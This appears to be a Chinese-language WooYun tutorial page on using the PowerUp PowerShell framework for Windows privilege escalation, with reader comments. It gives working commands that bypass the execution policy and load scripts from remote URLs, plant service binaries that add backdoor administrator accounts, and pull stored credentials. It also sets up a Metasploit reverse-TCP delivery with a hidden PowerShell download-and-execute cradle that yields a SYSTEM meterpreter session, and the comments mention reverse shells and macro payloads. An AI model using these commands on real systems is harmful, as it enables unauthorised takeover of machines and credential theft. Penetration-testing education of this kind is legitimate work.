@@ -1,0 +1,131 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Powershell 提权框架-Powerup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Evi1cg</a> <span class="bull">·</span> <time title="2016/01/13 10:12" ui-time="" datetime="2016/01/13 10:12" class="published ng-binding ng-isolate-scope">2016/01/13 10:12</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powershell框架-Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p><h1>0x01 使用</h1><hr><p>要使用Powerup，首先需要下载此脚本:<a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">Powerup</a>，之后加载此脚本：</p><pre><code>#!bash
+E:&gt; powershell.exe -nop -exec bypass
+PS E:\&gt; Import-Module .\PowerUp.psm1
+</code></pre><p>加载完成以后，便可以使用Powerup中的所有模块了。</p><p>通过如下命令可以查看所有模块：</p><pre><code>#!bash
+PS E:\&gt; Get-Command -Module powerup
+</code></pre><p><img alt="Alt text" img-src="a0905c0aa9ee78bc49c0c2c8283b871c0c3f01a6.jpg"></p><p>输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用"<code>Get-help [cmdlet] -full</code>"来查看，比如"<code>Get-Help Find-DLLHijack -full</code>"， 如果要将输出的结果导出到一个文件可以使用<code>Out-File</code>，如下：</p><pre><code>#!bash
+PS E:\&gt; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+</code></pre><blockquote><p>上述命令使用了Invoke-AllChecks，脚本将会进行所有的检查</p></blockquote><p>在cmd环境下，可以使用下列方式来运行该脚本：</p><pre><code>#!bash
+E:\&gt; powershell.exe -exec bypass -Command "&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+</code></pre><p>如果你想在内存加载此脚本，可以用下列方式：</p><pre><code>#!bash
+E:\&gt; powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfP'); Invoke-AllChecks"
+</code></pre><p>除此之外，Metasploit上同样包含执行powershell脚本的模块<a href="https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/post/windows/manage/powershell/exec_powershell.rb">exec_powershell.rb</a>，通过此模块，可以通过msf会话来执行powershell。</p><h1>0x02 模块介绍</h1><hr><p><strong>Find-DLLHijack</strong></p><p>检查每个进程所加载的模块，返回已经加载且不在其可执行目录的模块的目录。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Find-DLLHijack #返回所有的dll路径
+PS C:\&gt; Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles #返回排除C:\Windows\*； C:\Program Files\*；C:\Program Files (x86)\*以外的dll路径
+PS C:\&gt; Find-DLLHijack -ExcludeOwned #返回不属于当前用户所有进程权限的dll路径
+</code></pre><p><strong>Find-PathHijack</strong></p><p>检查当前<code>%PATH%</code>是否存在哪些目录是当前用户可以写入的。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Find-PathHijack
+</code></pre><p><strong>Get-ApplicationHost</strong></p><p>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt;get-ApplicationHost
+PS C:\&gt;get-ApplicationHost | Format-Table -Autosize # 列表显示
+</code></pre><p><strong>Get-ModifiableFile</strong></p><p>检查某个文件当前用户是否拥有修改权限，并返回有权限的文件路径。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; '"E:\temp\123123.xlsx" -f "C:\LibAntiPrtSc_ERROR.log"' | Get-ModifiableFile
+</code></pre><blockquote><p>前面为文件路径</p></blockquote><p><img alt="Alt text" img-src="9cefe2f2451a9ae21d38c5fcac6cf34e3e660602.jpg"></p><p><strong>Get-RegAlwaysInstallElevated</strong></p><p>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-RegAlwaysInstallElevated
+</code></pre><p><strong>Get-RegAutoLogon</strong></p><p>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。与msf <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb">windows_autologin.rb</a>模块相同。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-RegAutoLogon
+</code></pre><p><strong>Get-ServiceDetail</strong></p><p>返回某服务的信息。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-ServiceDetail -ServiceName Dhcp #获取DHCP服务的详细信息
+</code></pre><p><img alt="Alt text" img-src="0f84d751a6b51ee5164f91dbe7e00cd9b1c2d15b.jpg"></p><p><strong>Get-ServiceFilePermission</strong></p><p>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-ServiceFilePermission
+</code></pre><p><img alt="Alt text" img-src="7cbf1fbbea8fe718d6607a964540e9b8032d6806.jpg"></p><p><strong>Get-ServicePermission</strong></p><p>检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-ServicePermission
+</code></pre><p><strong>Get-ServiceUnquoted</strong></p><p>检查服务路径，返回包含空格但是不带引号的服务路径，类似于msf的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb">trusted&#95;service&#95;path.rb</a>。</p><p>此处利用的windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升。</p><blockquote><p>比如<code>C:\program files\hello.exe</code>,会被解释为<code>C:\program.exe</code>以及<code>C:\program files\hello.exe</code></p></blockquote><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt;Get-ServiceUnquoted
+</code></pre><p><img alt="Alt text" img-src="b7a7a4730110463bab29d2c6b5e9ae338d1a1a30.jpg"></p><p><strong>Get-UnattendedInstallFile</strong></p><p>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据。这些文件包括：</p><ul><li>c:\sysprep\sysprep.xml</li><li>c:\sysprep\sysprep.inf</li><li>c:\sysprep.inf</li><li>c:\windows\Panther\Unattended.xml</li><li>c:\windows\Panther\Unattend\Unattended.xml</li><li>c:\windows\Panther\Unattend.xml</li><li>c:\windows\Panther\Unattend\Unattend.xml</li><li>c:\windows\System32\Sysprep\unattend.xml</li><li>c:\windows\System32\Sysprep\Panther\unattend.xml</li></ul><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-UnattendedInstallFile
+</code></pre><p><strong>Get-VulnAutoRun</strong></p><p>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径。</p><p>注册表检查的键值为：</p><pre><code>#!bash
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService
+</code></pre><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-VulnAutoRun
+</code></pre><p><strong>Get-VulnSchTask</strong></p><p>返回当前用户能够修改的计划任务程序的名称和路径。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Get-VulnSchTask
+</code></pre><p><strong>Get-Webconfig</strong></p><p>返回当前服务器上的web.config文件中的数据库连接字符串的明文。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt;get-webconfig  
+PS C:\&gt;get-webconfig | Format-Table -Autosize #列表显示
+</code></pre><p><strong>Invoke-AllChecks</strong></p><p>执行所有的脚本来检查。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Invoke-AllChecks
+</code></pre><p><img alt="Alt text" img-src="db384ca17ccbe2b1fc7041f3fe5d4adb4599847e.jpg"></p><p><strong>Invoke-Service</strong></p><ul><li>Invoke-ServiceDisable 禁用服务</li><li>Invoke-ServiceEnable 启用服务</li><li>Invoke-ServiceStart 启动服务</li><li>Invoke-ServiceStop 停止服务</li></ul><p>执行方式为：</p><pre><code>#!bash
+PS C:\&gt; Invoke-ServiceDisable -ServiceName 服务名称。
+</code></pre><ul><li>Invoke-ServiceAbuse</li></ul><p>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令。</p><p>执行方式:</p><pre><code>#!bash
+PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号
+PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john" # 指定添加域账号
+PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Administrators" # 指定添加用户，用户密码以及添加的用户组。
+PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..." # 自定义执行命令
+</code></pre><p>默认的账号可以通过修改默认参数来修改，如下图：</p><p><img alt="Alt text" img-src="213a727de205ae0be414a5e3c9ef8a67c414464f.jpg"></p><p><strong>Restore-ServiceBinary</strong></p><p>恢复服务的可执行文件到原始目录。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC
+</code></pre><p><strong>Test-ServiceDaclPermission</strong></p><p>检查某个用户是否在一个服务有自由访问控制的权限，返回true或false。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC
+</code></pre><p><strong>Write-HijackDll</strong></p><p>输出一个自定义命令并且能够自删除的bat文件到$env:Temp\debug.bat，并输出一个能够启动这个bat文件的dll。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Write-HijackDll -OutputFile 'E:\temp\test.dll' -Command 'whoami'
+</code></pre><p><img alt="Alt text" img-src="59c74d5c8e67d445c308df4f03b49df438dee876.jpg"></p><p><strong>Write-UserAddMSI</strong></p><p>生成一个安装文件，运行这个安装文件，则弹出添加用户的框。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Write-UserAddMSI
+</code></pre><p><strong>Write-ServiceBinary</strong></p><p>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号
+PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john" # 指定添加域账号
+PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组。
+PS C:\&gt; Write-ServiceBinary -ServiceName VulnSVC -Command "net ..." # 自定义执行命令
+</code></pre><p><strong>Install-ServiceBinary</strong></p><p>通过Write-ServiceBinary写一个C#的服务用来添加用户。</p><p>执行方式：</p><pre><code>#!bash
+PS C:\&gt; Install-ServiceBinary -ServiceName DHCP
+PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
+PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
+PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."
+</code></pre><blockquote><p><code>Write-ServiceBinary</code>与<code>Install-ServiceBinary</code>不同的是前者生成可执行文件，后者直接安装服务。</p></blockquote><h1>0x03 实战提权</h1><hr><p>测试环境为win10。平常用的虚拟机，并没有特意去配置存在漏洞的环境，所以并不是所有的模块均可以使用。实际测试可以根据实际环境来调整。此次测试并未使用内核漏洞来提权。</p><p>首先添加低权限测试账号，使用管理员身份运行cmd，添加测试账号：</p><pre><code>#!bash
+C:\Windows\system32&gt;net user powerup 1 /add
+</code></pre><p>查看powerup账号权限：</p><p><img alt="Alt text" img-src="ec7aff04f8a04ee5e42b42f41bc770340ff93948.jpg"></p><p>使用powerup账号登陆系统，加载Powerup：</p><p><img alt="Alt text" img-src="5559646558d1d2897ab9c880e03a8d0fb98790fb.jpg"></p><p>执行Invoke-AllChecks:</p><pre><code>#!bash
+PS E:\&gt; Invoke-AllChecks
+</code></pre><p>执行以后找到下列问题：</p><pre><code>#!bash
+[*] Checking for unquoted service paths...
+
+
+ServiceName   : CDROM_Detect
+Path          : C:\Program Files\4G USB Modem\4G_Eject.exe
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'CDROM_Detect' -Path &lt;HijackPath&gt;
+
+ServiceName   : hMailServer
+Path          : C:\Program Files (x86)\hMailServer\Bin\hMailServer.exe RunAsService
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'hMailServer' -Path &lt;HijackPath&gt;
+
+[*] Checking service executable and argument permissions...
+
+ServiceName    : wampapache
+Path           : "c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe" -k runservice
+ModifiableFile : c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe
+StartName      : LocalSystem
+AbuseFunction  : Install-ServiceBinary -ServiceName 'wampapache'
+
+ServiceName    : wampmysqld
+Path           : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe wampmysqld
+ModifiableFile : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe
+StartName      : LocalSystem
+AbuseFunction  : Install-ServiceBinary -ServiceName 'wampmysqld'
+</code></pre><p>可以看出，Powerup列出了可能存在问题的服务，并在AbuseFunction中给了接下来的利用方式。在上面两个利用点可以看出，<code>unquoted service paths</code>中给出了两个路径带空格的文件路径，但是因为其在c盘，没有权限，所以并不能被我们利用来提权。而第二个检查通过<code>Get-ServiceFilePermission</code>找到两个当前用户可以写入相关联可执行文件的路径，我们就可以通过这个来进行提权。在AbuseFunction那里已经给了我们操作方式，接下来我们执行如下操作：</p><pre><code>#!bash
+PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -UserName rockyou -Password 123
+</code></pre><p><img alt="Alt text" img-src="5bdeae90ea9b9636a5762bd82eec40274de238e3.jpg"></p><p>之后当管理员运行该服务的时候，则会添加我们的账号，运行前：</p><p><img alt="Alt text" img-src="b45ba123fd83a1ece4389bf1c2a70eb6f16452f3.jpg"></p><p>运行服务以后：</p><p><img alt="Alt text" img-src="75a0f1d2e96110d8578a66d3fb3a4e0bb16e50be.jpg"></p><p>查看该账号权限：</p><p><img alt="Alt text" img-src="ced5d1d1f47bd9e4a89c6c7d5b247660aed5b90c.jpg"></p><p>当然，除了添加账号，我们同样可使用msf获得meterpreter会话。</p><p>使用<code>web_delivery</code> 模块开启监听：</p><pre><code>#!bash
+msf &gt; use exploit/multi/script/web_delivery 
+msf exploit(web_delivery) &gt; set URIPATH /
+URIPATH =&gt; /
+msf exploit(web_delivery) &gt; set lport 8888
+lport =&gt; 8888
+msf exploit(web_delivery) &gt; set target 2
+target =&gt; 2
+msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(web_delivery) &gt; set SRVPORT 8080
+SRVPORT =&gt; 8080
+msf exploit(web_delivery) &gt; set LHOST 192.168.74.1 
+msf exploit(web_delivery) &gt; exploit 
+</code></pre><p>执行如下命令：</p><pre><code>#!bash
+PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -Command "powershell.exe -nop -w hidden -c `$m=new-object net.webclient;`$m.proxy=[Net.WebRequest]::GetSystemWebProxy();`$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `$m.downloadstring('http://192.168.74.1:8080/');"
+</code></pre><blockquote><p>要注意 <code>$</code> 符号前面要加`来转义</p></blockquote><p>当管理员运行此服务以后则获取高权限的meterpreter会话</p><p><img alt="Alt text" img-src="79b5d19582747200a300847ff2167319acd23647.jpg"></p><p>提权以后，使用<code>Restore-ServiceBinary</code> 恢复文件：</p><pre><code>#!bash
+PS E:\&gt; Restore-ServiceBinary -ServiceName 'wampapache'
+</code></pre><p><img alt="Alt text" img-src="b4ea312974363b667c51bc33ba70768de6d3546a.jpg"></p><p>可以看到，我们使用powerup成功提权了。当然碰到实际的环境可以根据不同环境不同方式来进行提权。</p><h1>0x05 小结</h1><hr><p>Powerup提供了一些我们并不常见的提权方式，并且为我们的Windows提权提供了极大的方便，如果碰到未安装Powershell的计算机，可以详细参考Powerup里面的函数实现过程来通过别的方式来实现同样的效果，希望本文对你有帮助。</p><p><strong>本文由evi1cg原创并首发于乌云drops，转载请注明</strong></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/3473" rel="bookmark" id="re1">Powershell tricks::Powershell Remoting</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re2">Powershell tricks::Bypass AV</a></li><li><a href="http://drops.wooyun.org/tips/8568" rel="bookmark" id="re3">使用powershell Client进行有效钓鱼</a></li><li><a href="http://drops.wooyun.org/tips/10556" rel="bookmark" id="re4">Powershell tricks::Code Execution &amp; Process Injection</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Anonymous</span> <span class="reply-time">2016-01-14 00:43:18</span></div><p></p><p>还有一些其他问题</p><p>尝试在阿里云ECS上启动服务端 nc -lvp 4444，本机启动反弹shell，不过感觉连接失败了，是因为阿里云的某些安全配置吗？</p><p>Invoke-PowerShellTcp : 使用“2”个参数调用“.ctor”时发生异常:“由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 123.123.123.123:4444”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1cg</span> <span class="reply-time">2016-01-13 20:56:47</span></div><p></p><p>@Anonymous 我试了一下没发现你的问题啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1cg</span> <span class="reply-time">2016-01-13 20:37:58</span></div><p></p><p>@奋斗的阿呆 就是存在问题的那个服务，普通用户执行以后，会把原来的httpd.exe替换，然后当管理员开启此服务的时候，会运行被替换的httpd.exe，服务会正常运行，而我们也能达到提权的目的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Anonymous</span> <span class="reply-time">2016-01-13 17:14:33</span></div><p></p><p>想咨询楼主一个关于nishang的问题<br>再用Out-Word的时候出现的</p><p>错误log如下</p><p>PS I:\PowerShellToolkit\nishang-master\Client&gt; Out-Word -Payload &quot;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process&quot;</p><p>RPC 服务器不可用。 (异常来自 HRESULT:0x800706BA)<br>所在位置 I:\PowerShellToolkit\nishang-master\Client\Out-Word.ps1:218 字符: 9<br>+ $DocModule = $Doc.VBProject.VBComponents.Item(1)<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>+ CategoryInfo : OperationStopped: (:) [], COMException<br>+ FullyQualifiedErrorId : System.Runtime.InteropServices.COMException</p><p>不能对 Null 值表达式调用方法。<br>所在位置 I:\PowerShellToolkit\nishang-master\Client\Out-Word.ps1:219 字符: 9<br>+ $DocModule.CodeModule.AddFromString($code)<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>+ CategoryInfo : InvalidOperation: (:) []，RuntimeException<br>+ FullyQualifiedErrorId : InvokeMethodOnNull</p><p>使用“2”个参数调用“SaveAs”时发生异常:“RPC 服务器不可用。 (异常来自 HRESULT:0x800706BA)”<br>所在位置 I:\PowerShellToolkit\nishang-master\Client\Out-Word.ps1:226 字符: 13<br>+ $Doc.Saveas([ref]$OutputFile, [ref]0)<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>+ CategoryInfo : NotSpecified: (:) [], MethodInvocationException<br>+ FullyQualifiedErrorId : COMException</p><p>Saved to file I:\PowerShellToolkit\nishang-master\Client\Salary_Details.doc<br>使用“0”个参数调用“Close”时发生异常:“RPC 服务器不可用。 (异常来自 HRESULT:0x800706BA)”<br>所在位置 I:\PowerShellToolkit\nishang-master\Client\Out-Word.ps1:229 字符: 9<br>+ $Doc.Close()<br>+ ~~~~~~~~~~~~<br>+ CategoryInfo : NotSpecified: (:) [], MethodInvocationException<br>+ FullyQualifiedErrorId : COMException</p><p>使用“0”个参数调用“Quit”时发生异常:“RPC 服务器不可用。 (异常来自 HRESULT:0x800706BA)”<br>所在位置 I:\PowerShellToolkit\nishang-master\Client\Out-Word.ps1:230 字符: 9<br>+ $Word.quit()<br>+ ~~~~~~~~~~~~<br>+ CategoryInfo : NotSpecified: (:) [], MethodInvocationException<br>+ FullyQualifiedErrorId : COMException</p><p>0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">奋斗的阿呆</span> <span class="reply-time">2016-01-13 16:34:12</span></div><p></p><p>当管理员运行服务，没读懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">隐形人真忙</span> <span class="reply-time">2016-01-13 15:08:35</span></div><p></p><p>不错 感谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小白</span> <span class="reply-time">2016-01-13 14:53:11</span></div><p></p><p>小白学习了</p><p></p></div></div></div></div></div></main>
